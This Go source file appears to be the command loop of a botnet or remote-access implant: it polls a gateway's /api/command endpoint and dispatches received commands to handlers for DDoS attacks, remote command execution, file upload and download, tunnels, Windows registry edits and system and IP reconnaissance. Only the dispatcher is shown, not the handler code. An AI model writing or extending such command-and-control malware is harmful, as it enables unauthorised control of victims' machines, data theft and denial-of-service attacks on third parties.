package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"golang.org/x/text/cases"
	"golang.org/x/text/language"
)

type CommandBase struct {
	Name string `json:"name"`
	Args interface{}
}

func getCommandName(body []byte, err error) (string, []byte) {
	log.Println(string(body[:]))
	data := CommandBase{}
	err = json.Unmarshal(body, &data)
	if err != nil {
		log.Fatal(err)
	}

	return data.Name, body
}

func camelCaseCommand(command string) string {
	words := strings.Split(command, "-")
	key := ""
	for _, word := range words {
		key += cases.Title(language.Und, cases.NoLower).String(word)
	}
	return key
}

func getCommand(CONFIG *Config) string {
	client := &http.Client{}

	urlToRequest := fmt.Sprintf("http://%s/api/command", CONFIG.Gateway)

	req, err := http.NewRequest("GET", urlToRequest, nil)
	if err != nil {
		log.Fatal(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	name, byteBody := getCommandName(io.ReadAll(resp.Body))

	switch camelCaseCommand(name) {
	case "SetRelay":
		data := SetRelayParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			panic(err)
		}

		setRelay(data, CONFIG)
	case "SetPullingRate":
		data := SetPullingRateParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		setPullingRate(data, CONFIG)
	case "OpenTunnel":
		data := OpenTunnelParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		openTunnel(data)
	case "GetSysInfo":
		data := GetSysInfoParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		getSysInfo(data)
	case "Ping":
		data := PingParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		ping(data)
	case "Ddos":
		data := DdosParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		ddos(data)
	case "DownloadFile":
		data := DownloadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		downloadFile(data)
	case "UploadFile":
		data := UploadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		uploadFile(data)
	case "GetPublicIp":
		data := GetPublicIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		getPublicIp(data)
	case "GetPrivateIp":
		data := GetPrivateIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		getPrivateIp(data)
	case "CreateRegValue":
		data := CreateRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		createRegValue(data)
	case "EditRegValue":
		data := EditRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		editRegValue(data)
	case "DeleteRegValue":
		data := DeleteRegValueParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		deleteRegValue(data)
	case "RunCommand":
		data := RunCommandParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		runCommand(data)
	}

	return "foo"
}
